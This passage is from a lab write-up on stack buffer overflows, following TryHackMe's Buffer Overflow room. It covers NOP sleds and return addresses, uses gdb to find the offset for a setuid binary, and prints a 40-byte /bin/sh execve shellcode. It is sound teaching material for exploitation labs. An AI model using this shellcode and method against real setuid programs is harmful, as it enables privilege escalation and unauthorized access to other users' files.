<li>inspect the registers in <code>gdb</code> (e.g. <code>i r</code> or <code>x/100 $rsp-200</code>) to see where the pattern has ended up overwriting</li>
<li>use <code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &lt;buffer size /&gt; -q &lt;address /&gt;</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nop-sled">NOP Sled<a href="#nop-sled" class="hash-link" aria-label="Direct link to NOP Sled" title="Direct link to NOP Sled">‚Äã</a></h3>
<p>A &quot;no operation&quot; byte aka <code>\x90</code> or <code>NOP</code> is (my own words) a byte that takes up space and does nothing when hit, but pass execution along to the next byte.</p>
<blockquote>
<p>Why do we need one?</p>
</blockquote>
<p>The return address we&#x27;re overwriting onto the EIP is a very specific location pointing to the start of our shellcode to be executed.</p>
<p>The problem with this is, shit happens on computers all the time which move the address space around, which could affect our shellcode being executed correctly.</p>
<p>To allow for this scenario, we use a &quot;NOP sled&quot; i.e. a string of NOPs that start at the beginning of our buffer, in front of our shellcode, so when the EIP sends execution to the beginning of our buffer, the NOP sled will &quot;no execute and pass along&quot; the pointer eventually to the start of our shellcode.</p>
<p>The NOP sled can be any size, but bear in mind it shares the same &quot;offset&quot; space with the Shellcode and Alignment, so combined these cannot add up to <em>more</em> than the offset size.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode">Shellcode<a href="#shellcode" class="hash-link" aria-label="Direct link to Shellcode" title="Direct link to Shellcode">‚Äã</a></h3>
<p>A few ways to generate shellcode</p>
<ol>
<li>msfvenom</li>
<li><a href="https://masterccc.github.io/tools/shellcode_gen/" target="_blank" rel="noopener noreferrer">/bin/cat</a></li>
<li><a href="https://docs.pwntools.com/en/stable/" target="_blank" rel="noopener noreferrer">pwntools</a></li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="alignment">Alignment<a href="#alignment" class="hash-link" aria-label="Direct link to Alignment" title="Direct link to Alignment">‚Äã</a></h3>
<p>The alignment bytes just make up the difference between the shellcode and the end of the offset.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="return-address">Return Address<a href="#return-address" class="hash-link" aria-label="Direct link to Return Address" title="Direct link to Return Address">‚Äã</a></h3>
<p>The size of this is determined by what we say in the &quot;finding the offset&quot;, where the EIP gets filled up with <code>A</code>&#x27;s until we see something like this for the crashed return address in gdb: <code>0x0000414141414141</code>, telling us the return address size is <code>6 bytes</code>.</p>
<blockquote>
<p>But what address are we writing in here?</p>
</blockquote>
<p>Now that we know our <code>NOP Sled</code> is going to be at the start of our payload/buffer, we want the address where our <code>NOP</code>&#x27;s can be found.</p>
<p>For example, if we&#x27;ve got most of our payload determined:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print $nop_sled + $shellcode + $alignment + $return_address&quot;)</span><br></span></code></pre></div></div>
<p>We send this off and can see the return address being overwritten...</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000414141414141 in ?? ()</span><br></span></code></pre></div></div>
<p>Staying inside <code>gdb</code>, dump the memory and look for our <code>NOP</code>&#x27;s i.e. <code>0x90909090</code>&#x27;s.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) x/100x $rsp-200</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8c8: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8d8: 0xffffecea      0x00007fff      0x67676f64      0x9090906f</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8e8: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe8f8: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe908: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe918: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe928: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe938: 0x90909090      0x90909090      0x90909090      0xff319090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe948: 0x03eabf66      0x4858716a      0x050ffe89      0x48583b6a</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe958: 0xb849d231      0x69622f2f      0x68732f6e      0x08e8c149</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe968: 0x89485041      0x485752e7      0x050fe689      0x48583c6a</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe978: 0x050fff31      0x42424242      0x42424242      0x42424242</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe988: 0x41414141      0x00004141      0xffffea88      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe998: 0x00000000      0x00000002      0x004005e0      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9a8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9b8: 0xffffea88      0x00007fff      0x00040000      0x00000002</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9c8: 0x004005ac      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9d8: 0x794daa23      0x97320a39      0x00400450      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9e8: 0xffffea80      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe9f8: 0x00000000      0x00000000      0xa1edaa23      0x68cdf546</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea08: 0x2d49aa23      0x68cde5f1      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea18: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea28: 0xffffeaa0      0x00007fff      0xf7ffe130      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea38: 0xf7de7656      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffea48: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span></code></pre></div></div>
<p>Pick any address where you see the <code>0x90909090</code>&#x27;s and write it in little edian format e.g. <code>0x7fffffffe8f8</code> becomes <code>\xf8\xe8\xff\xff\xff\x7f</code>.</p>
<p>You now have the last piece of the payload puzzle.</p>
<div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Offset / Payload Size</div><div class="admonitionContent_BuS1"><p>The size in bytes of the <code>offset</code> <strong>must be maintained at all times</strong>. If you mess up the offset, you will mess up overwriting the EIP which is crucial for pointing the execution flow to our shellcode.</p><p>So, if the offset is <code>169</code> bytes, then <code>NOP</code> + <code>shellcode</code> + <code>Alignment</code> + <code>return_address</code> <em>must</em> equal <code>169</code> bytes exactly.</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="buffer-overflow-1">Buffer Overflow #1<a href="#buffer-overflow-1" class="hash-link" aria-label="Direct link to Buffer Overflow #1" title="Direct link to Buffer Overflow #1">‚Äã</a></h2>
<p>The scenario, is a buffer-overflow program belonging to <code>user1</code> will be used to read a <code>secret.txt</code> file belonging to <code>user2</code>:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">[user1@ip-10-10-79-28 overflow-3]$ ll</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">total 24</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt</span><br></span></code></pre></div></div>
<p>Notes on an overflow using this program from TryHackMe <a href="https://tryhackme.com/room/bof1" target="_blank" rel="noopener noreferrer">Buffer Overflow Room</a> task 8.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token macro property directive-hash" style="color:rgb(128, 203, 196)">#</span><span class="token macro property directive keyword" style="color:rgb(127, 219, 202)">include</span><span class="token macro property" style="color:rgb(128, 203, 196)"> </span><span class="token macro property string" style="color:rgb(173, 219, 103)">&lt;stdio.h /&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token macro property directive-hash" style="color:rgb(128, 203, 196)">#</span><span class="token macro property directive keyword" style="color:rgb(127, 219, 202)">include</span><span class="token macro property" style="color:rgb(128, 203, 196)"> </span><span class="token macro property string" style="color:rgb(173, 219, 103)">&lt;stdlib.h /&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">copy_arg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain">string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">140</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">strcpy</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">printf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;%s\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">main</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token keyword" style="color:rgb(127, 219, 202)">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">printf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Here&#x27;s a program that echo&#x27;s out your input\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">copy_arg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre></div></div>
<p>this technique uses Python, GDB and a clear understanding of all elements of the Stack.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="find-the-offset-1">Find the offset<a href="#find-the-offset-1" class="hash-link" aria-label="Direct link to Find the offset" title="Direct link to Find the offset">‚Äã</a></h3>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>The offset is the amount of bytes between filling up the buffer and the start of the return address.</p><p>offset = <code>buffer[140] + alignment bytes + rbp[8]</code></p></div></div>
<p>use Python and GDB to find the offset i.e. number of bytes it takes to overwrite the return address.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print(&#x27;A&#x27; * 150)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print(&#x27;A&#x27; * 150)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400595 in main ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print(&#x27;A&#x27; * 151)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print(&#x27;A&#x27; * 151)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGBUS, Bus error.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400595 in main ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print(&#x27;A&#x27; * 152)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print(&#x27;A&#x27; * 152)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGILL, Illegal instruction.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400500 in __do_global_dtors_aux ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print(&#x27;A&#x27; * 155)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print(&#x27;A&#x27; * 155)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000414141 in ?? ()</span><br></span></code></pre></div></div>
<p>line <code>0x0000000000400595 in main ()</code> is the return address</p>
<p>what we&#x27;re trying to do is overwrite it with until we see all <code>A</code>s i.e. <code>\x41</code> all over the return address like the following:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print(&#x27;A&#x27; * 158)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print(&#x27;A&#x27; * 158)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000414141414141 in ?? ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print(&#x27;A&#x27; * 159)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print(&#x27;A&#x27; * 159)&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400563 in copy_arg ()</span><br></span></code></pre></div></div>
<p>you know you&#x27;ve gone OVER it when the return address goes from <code>41</code>s to some other bytes.</p>
<p>so, we now know  <code>158</code> bytes is the right amount of bytes to fill a) the buffer, b) the alignment bytes and c) the rbp (saved registers) and the 6-byte return address.</p>
<p><code>offset = 158 - 6 = 152</code></p>
<p>so - <code>152</code> bytes to fill the buffer (plus alignment + rbp), <code>6</code> bytes to overwrite return address.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode--return-address">shellcode + return address<a href="#shellcode--return-address" class="hash-link" aria-label="Direct link to shellcode + return address" title="Direct link to shellcode + return address">‚Äã</a></h3>
<p>use this <code>40-bytes</code> shellcode:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05</span><br></span></code></pre></div></div>
<p>key note from the author: simple shellcodes without an exit function messes the overflow up, check this.</p>
<p>we need to find the return address for the start of our shellcode, so we can put this into our overflow to jump to our code when the program is exploited.</p>
<p>so our payload needs to be a total bytes: <code>152 + return address (6) = 158</code> at all times.</p>
<p><code>PAYLOAD = JUNK + SHELLCODE + JUNK + RETURN_ADDRESS</code> e.g. <code>payload = &#x27;A&#x27;*100 + &#x27;shellcode&#x27; + &#x27;B&#x27;*12 + &#x27;C&#x27;*6</code></p>
<p>using gdb, run this:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27; * 100 + shellcode + &#x27;B&#x27; * 12 + &#x27;C&#x27; * 6&quot;)</span><br></span></code></pre></div></div>
<p>then dump the memory to see where the payload ended up, and the memory addresses associated with it.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) x/100x $rsp-200</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span 